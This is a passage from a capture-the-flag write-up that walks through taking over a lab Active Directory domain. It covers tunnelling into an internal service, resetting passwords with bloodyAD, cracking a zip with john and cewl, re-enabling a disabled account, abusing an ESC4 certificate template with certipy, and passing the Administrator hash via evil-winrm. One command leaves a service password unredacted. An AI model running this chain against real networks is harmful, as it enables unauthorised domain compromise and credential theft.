![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FmH6sPb5t5XeoJ52fV51B%252Fgrafik.png%3Falt%3Dmedia%26token%3D278c055f-dfdb-40d0-8c3c-c265d26cb7c1\&width=768\&dpr=3\&quality=100\&sign=7d4c94e0\&sv=2)

Inside that proxy we create an interface called `bank`.

```bash
ifcreate --name bank
```

Next, we add a single route to the interface to reach the internal services of the host.

```bash
route_add --name bank --route 240.0.0.1/32
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FSiXU16hGki5fHrMNBMUe%252Fgrafik.png%3Falt%3Dmedia%26token%3D28c30cf2-75e3-4764-931b-6d5e8a30c82c\&width=768\&dpr=3\&quality=100\&sign=9e50d705\&sv=2)

```bash
./agent.exe -connect 10.200.33.13:11601 --ignore-cert
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F4xiZITvGlbDm6Ixx6A8g%252Fgrafik.png%3Falt%3Dmedia%26token%3D3ef82487-e0f2-45ca-9316-39b38f11c45a\&width=768\&dpr=3\&quality=100\&sign=5ef00d1\&sv=2)

After the connection has been made we should see in our proxy that an agent has joined.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F7znw92MjOJuQqJsxyQOR%252Fgrafik.png%3Falt%3Dmedia%26token%3D6af4ea51-57c3-43b3-84bb-fb490f70b25d\&width=768\&dpr=3\&quality=100\&sign=d6b51b54\&sv=2)

We can list and interact with the session by calling `session` and then choosing the session. The following screenshot illustrates the steps taken.

```bash
session
```

After choosing the session, we can start the tunnel.

```bash
tunnel_start --tun bank
```

To confirm our tunnel and routes we can issue the following commands:

```bash
tunnel_list
```

```bash
route_list
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F3c7Jj41QhmeL6Y3Vl1QA%252Fgrafik.png%3Falt%3Dmedia%26token%3Da717ebff-c0c3-4400-9fc3-590047327239\&width=768\&dpr=3\&quality=100\&sign=c2062c5a\&sv=2)

We can now reach the internal web service running on port 5000 via `http://240.0.0.1:5000`. This requires basic authentication.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F5pGbveM8YP49N8JBKtY0%252Fgrafik.png%3Falt%3Dmedia%26token%3D9ec564d1-30ae-4a59-8947-5b086a6394dc\&width=768\&dpr=3\&quality=100\&sign=b9d570a\&sv=2)

We'll try using the `webadmin`. But first we need a password for it. We'll change the password as usual using bloodyAD.

```bash
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'daniel.hoffmann' -p 'REDACTED' set password 'webadmin' 'Pwned123@!'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FlBGTILigE4OFBlfp1frn%252Fgrafik.png%3Falt%3Dmedia%26token%3D94f87059-1af9-486b-a155-7d5d07d29095\&width=768\&dpr=3\&quality=100\&sign=eba9910c\&sv=2)

## Access as svc.services

Next, we enter our set credentials...

```bash
http://240.0.0.1:5000/
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FBkqtpN8btXOCf33FqUhw%252Fgrafik.png%3Falt%3Dmedia%26token%3De1a13068-f02e-41b1-acab-5063a533e3ec\&width=768\&dpr=3\&quality=100\&sign=7ee332de\&sv=2)

... and are able to log in. We can download the service `config_backup.zip` file.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Fqth0djcz2ep95PUQLJb7%252Fgrafik.png%3Falt%3Dmedia%26token%3D2ce12ab0-6a88-49c3-ab78-f5f4ed8a42c8\&width=768\&dpr=3\&quality=100\&sign=77d4e2a4\&sv=2)

The zip file is password protected. Using zip2john, we generate a hash that we then attempt to crack.

```bash
zip2john config_backup.zip > config_backup.zip.hash
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FatvCbWlPZtnVzmgMDbrr%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd65faa79-b925-4fb3-9a37-649d30ff466c\&width=768\&dpr=3\&quality=100\&sign=79770629\&sv=2)

However, our `rockyou.txt` does not seem to contain the password.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt config_backup.zip.hash
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FelvgCtWGs1YQYOi55WRD%252Fgrafik.png%3Falt%3Dmedia%26token%3D054d2128-ec28-4c89-bb66-4e670efc137c\&width=768\&dpr=3\&quality=100\&sign=b9d9b5bd\&sv=2)

We are trying to generate a word list from the keywords on the website. We extract these using cewl.

```bash
cewl --depth 10 --with-numbers --write cewl.txt http://404finance.local/history.html
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FTpuMGCWvSfo8g9jNkHPN%252Fgrafik.png%3Falt%3Dmedia%26token%3Dce280c69-9a42-46ca-be95-4c699d2ee3b2\&width=768\&dpr=3\&quality=100\&sign=e7f5e081\&sv=2)

Using our generated word list, we were able to successfully crack the password of the zip file and unzip its contents.

```bash
john --wordlist=./cewl.txt config_backup.zip.hash
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FjV7Lb2r9fZDmbwbpbt06%252Fgrafik.png%3Falt%3Dmedia%26token%3D5bbc14b2-bc03-4b86-a20b-7f757dd6a8d8\&width=768\&dpr=3\&quality=100\&sign=c422981b\&sv=2)

The zip file contains a `config.dat` file that contains the credentials for the user account `svc.services`.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FJkCAqdd8WUZRTFhdgHZf%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd95ee374-d2d8-4749-ac3e-948e93153cbc\&width=768\&dpr=3\&quality=100\&sign=7c10694e\&sv=2)

We test the credentials using NetExec but the account is disabled.

```bash
nxc smb 404finance.local -u 'svc.services' -p 'REDACTED'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FonSYsfRJSskigMILfK3K%252Fgrafik.png%3Falt%3Dmedia%26token%3D84d99ade-7d5d-4824-9c64-2eb18526add4\&width=768\&dpr=3\&quality=100\&sign=417040b6\&sv=2)

{% hint style="info" %}
Here is the crucial part that I missed in my initial enumeration. My version of `bloodhound-ce.py` does not seem to capture all relationships between the object completely.

In addition to `ForceChangePassword`, `robert.graef` has other permissions, including `WriteAccountRestrictions` on `svc.services`. This allows us to re-enable the `svc.services` account.

What `WriteAccountRestrictions` allows:

It lets you modify attributes that control logon behavior, including:

* `userAccountControl`
* Logon hours
* Workstation restrictions

And `ACCOUNTDISABLE` is just a bit inside `userAccountControl`

I received this tip from Schlop, who also introduced me to the GriffonAD tool, which is similar to a text-based version of BloodHound. I think it is a very cool tool that provides a good overview in small environments.

He also showed me his version, which he forked to implement additional features such as reading the entire zip file from a BloodHound enumeration.

[https://github.com/schlopshow/GriffonAD](https://github.com/schlopshow/GriffonAD)
{% endhint %}

We enable the account like the following using bloodyAD.

[User Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide#remove-uac)

```bash
bloodyAD --host DC-404.404finance.local -d 404finance.local -u robert.graef -p 'Pwned123@!' remove uac svc.services -f ACCOUNTDISABLE
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F4x4Qs5KvzAXkpy7dUWJT%252Fgrafik.png%3Falt%3Dmedia%26token%3D276c91b6-f08b-4a4a-a0ea-c7fcb00de82c\&width=768\&dpr=3\&quality=100\&sign=3d0e3a74\&sv=2)

We test the credentials using NetExec again and this time we can successfully authenticate.

```bash
nxc smb 404finance.local -u 'svc.services' -p 'REDACTED'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FoZm72wm42gjgs2cbxJQB%252Fgrafik.png%3Falt%3Dmedia%26token%3Db1790eb8-f6b5-4a15-b53c-86237e36f8c6\&width=768\&dpr=3\&quality=100\&sign=45ea8848\&sv=2)

## Shell as Administrator

The `svc.services` account is member of the Certificates Service DCOM Access group.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FvVL1Hd3DAVuEpTii3k3o%252Fgrafik.png%3Falt%3Dmedia%26token%3D7ed7097f-9c83-4efe-ae08-d8d36ca8df30\&width=768\&dpr=3\&quality=100\&sign=c53a93b3\&sv=2)

We check if we can find any misconfigured certificate templates to escalate our privileges. We find one. The template `Vuln-ESC4` is vulnerable to ESC4. ESC4 means we have write permissions on that certificate template, so we can modify it and turn it into an ESC1-style vulnerable template.

```bash
certipy find -u svc.services@404finance.local -p 'REDACTED' -dc-ip 404finance.local -vulnerable
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FC5M723QEarxNWvCac2ZS%252Fgrafik.png%3Falt%3Dmedia%26token%3D841e4a65-9e0c-4e17-a6a2-2bead95bd2f5\&width=768\&dpr=3\&quality=100\&sign=2c42af26\&sv=2)

`20260204000836_Certipy.json`

```json
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "404finance-DC-404-CA",
      "DNS Name": "DC-404.404finance.local",
      "Certificate Subject": "CN=404finance-DC-404-CA, DC=404finance, DC=local",
      "Certificate Serial Number": "49F9F3F512FE1BA84F59D5DAAD071218",
      "Certificate Validity Start": "2025-07-03 13:33:46+00:00",
      "Certificate Validity End": "2030-07-03 13:43:46+00:00",
      "Web Enrollment": "Disabled",
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Permissions": {
        "Owner": "404FINANCE.LOCAL\\Administrators",
        "Access Rights": {
          "2": [
            "404FINANCE.LOCAL\\Administrators",
            "404FINANCE.LOCAL\\Domain Admins",
            "404FINANCE.LOCAL\\Enterprise Admins"
          ],
          "1": [
            "404FINANCE.LOCAL\\Administrators",
            "404FINANCE.LOCAL\\Domain Admins",
            "404FINANCE.LOCAL\\Enterprise Admins"
          ],
          "512": [
            "404FINANCE.LOCAL\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "Vuln-ESC4",
      "Display Name": "Vuln-ESC4",
      "Certificate Authorities": [
        "404finance-DC-404-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        "EnrolleeSuppliesSubject"
      ],
      "Enrollment Flag": [
        "PublishToDs",
        "PendAllRequests",
        "IncludeSymmetricAlgorithms"
      ],
      "Private Key Flag": [
        "ExportableKey"
      ],
      "Extended Key Usage": [
        "Client Authentication",
        "KDC Authentication",
        "Server Authentication",
        "Smart Card Logon"
      ],
      "Requires Manager Approval": true,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 1,
      "Validity Period": "99 years",
      "Renewal Period": "650430 hours",
      "Minimum RSA Key Length": 2048,
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "404FINANCE.LOCAL\\Service Account"
          ]
        },
        "Object Control Permissions": {
          "Owner": "404FINANCE.LOCAL\\Enterprise Admins",
          "Full Control Principals": [
            "404FINANCE.LOCAL\\Domain Admins",
            "404FINANCE.LOCAL\\Local System",
            "404FINANCE.LOCAL\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "404FINANCE.LOCAL\\Service Account",
            "404FINANCE.LOCAL\\Domain Admins",
            "404FINANCE.LOCAL\\Local System",
            "404FINANCE.LOCAL\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "404FINANCE.LOCAL\\Service Account",
            "404FINANCE.LOCAL\\Domain Admins",
            "404FINANCE.LOCAL\\Local System",
            "404FINANCE.LOCAL\\Enterprise Admins"
          ],
          "Write Property Principals": [
            "404FINANCE.LOCAL\\Service Account",
            "404FINANCE.LOCAL\\Domain Admins",
            "404FINANCE.LOCAL\\Local System",
            "404FINANCE.LOCAL\\Enterprise Admins"
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC4": "'404FINANCE.LOCAL\\\\Service Account' has dangerous permissions"
      }
    }
  }
}
```

Template name:

```
Vuln-ESC4
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Fj9qY9g9qRYAKn9jQ55Un%252Fgrafik.png%3Falt%3Dmedia%26token%3D753604c1-923d-46fe-a0e7-675cba43c2be\&width=768\&dpr=3\&quality=100\&sign=e6dd6a6d\&sv=2)

We can follow the guide of Certipy's wiki if we are using the current version 5.0.2:

[06 ‐ Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking)

> **Step 1: Modify the template to a vulnerable state.** Certipy's `template` command with the `-write-default-configuration` option is a convenient way to automatically reconfigure a target template to a known ESC1-like vulnerable state. This option typically:
>
> * Enables "Enrollee Supplies Subject" (`msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT`).
> * Adds the "Client Authentication" EKU (`pKIExtendedKeyUsage` and `msPKI-Certificate-Application-Policy`).
> * Grants "Full Control" (which includes enrollment rights) on the template to the "Authenticated Users" group (by modifying `nTSecurityDescriptor`).
> * Disables manager approval (`msPKI-Enrollment-Flag` adjusted, `PendAllRequests` removed).
> * Sets "Authorized Signatures Required" to 0 (`msPKI-RA-Signature = 0`).
> * Clears any existing RA Application Policies (`msPKI-RA-Application-Policies`).

But in my case I’m using the old version of Certipy.

```bash
certipy template \
    -u 'svc.services@404finance.local' -p 'REDACTED' \
    -dc-ip '10.1.9.196' -template 'Vuln-ESC4' \
    -write-default-configuration
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Fe8g9ZGupAtKNcTol77kt%252Fgrafik.png%3Falt%3Dmedia%26token%3Dc598691c-59d0-44b0-a141-6582c0c6f4fd\&width=768\&dpr=3\&quality=100\&sign=99a9eb7a\&sv=2)

For a reference I suggest the following resource on how to exploit ESC4 with Certipy 4.8.2:

[ADCS Attacks with Certipy](https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/index.html)

We modify the certificate template...

```bash
certipy template -u 'svc.services@404finance.local' -p 'REDACTED' -dc-ip '10.1.9.196' -template 'Vuln-ESC4' -save-old
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FLVUzrFUCUhOwDcU1jyGq%252Fgrafik.png%3Falt%3Dmedia%26token%3D205a8a0f-6495-40bf-99a1-def2814e5d15\&width=768\&dpr=3\&quality=100\&sign=555348eb\&sv=2)

... and afterwards request a certificate that impersonates the Administrator account to obtain an authentication certificate for `administrator@404finance.local`.

> **Step 2: Request a certificate using the modified template.** The attacker now requests a certificate for a privileged user (e.g., Administrator), leveraging the ESC1 vulnerability they just created in the "SecureFiles" template.

```bash
certipy req -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' -dc-ip '10.1.9.196' -ca 404finance-DC-404-CA -template 'Vuln-ESC4' -upn 'administrator@404finance.local'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FyKCKVB504s5SFn9sIILl%252Fgrafik.png%3Falt%3Dmedia%26token%3D95b453e7-4813-49c2-9914-fb48c2a1d812\&width=768\&dpr=3\&quality=100\&sign=868d4fb1\&sv=2)

Next we authenticate using the obtained certificate. We are able to retrieve the NT hash of the `administrator` account.

> **Step 3: Authenticate using the obtained certificate.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.1.9.196'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FUweCnz5i9pzbP6npG7u3%252Fgrafik.png%3Falt%3Dmedia%26token%3D65220164-7d7a-4cdb-965c-b3b458e5ee6c\&width=768\&dpr=3\&quality=100\&sign=dc76462b\&sv=2)

We use the hash to authenticate as Administrator via Evil-WinRM, and retrieve the final flag at `C:\Users\Administrator\Desktop\root.txt`.

```bash
evil-winrm -i DC-404.404finance.local -u Administrator -H 'REDACTED'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FOVMJHDV2rNgu3HYZngkT%252Fgrafik.png%3Falt%3Dmedia%26token%3De6082e6b-7f20-4449-a761-179915bce2ff\&width=768\&dpr=3\&quality=100\&sign=b1e5821b\&sv=2)
